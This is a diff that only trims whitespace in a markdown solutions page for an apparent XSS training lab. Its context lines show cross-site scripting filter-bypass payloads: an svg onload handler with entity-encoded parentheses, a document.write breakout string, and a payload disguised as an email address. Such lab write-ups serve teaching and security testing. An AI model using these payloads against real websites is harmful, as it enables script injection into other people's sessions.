@@ -4,9 +4,7 @@
 
 <iframe src="https://hackxpert.com/RXSS/GET" width="100%" height="700px"></iframe>
 
-
 <p>This lab is based on<a href="https://brutelogic.com.br/blog/" target=”_blank”> brute's lab</a>.</p>
-
 
 ## Solutions
 
@@ -15,7 +13,7 @@
 ### 10: Basic HTML XSS
 Anything goes here, there is no protection
 
-### 11: 
+### 11:
 
 Here we introduced a filter to stop script and alert
 
@@ -75,7 +73,7 @@ This means you will have to double encode your URL values:
 Parenthesis are blocked BUT we can use the HTML entities
 
 ```javascript
-<svg onload=alert&lpar;1&rpar;> 
+<svg onload=alert&lpar;1&rpar;>
 
 <svg onload=alert&#40;1&#41>
 ```
@@ -105,11 +103,11 @@ We can see a new script appearing on the page upon submitting a value
 This does a `document.write('')`
 We can break out with
 
-```javascript 
+```javascript
 ');alert();//
 ```
 
-### 50: You need to disguise your XSS attack to LOOK like an email address, for example 
+### 50: You need to disguise your XSS attack to LOOK like an email address, for example
 
 ```javascript
 "><svg/onload=alert(1)>"@x.y
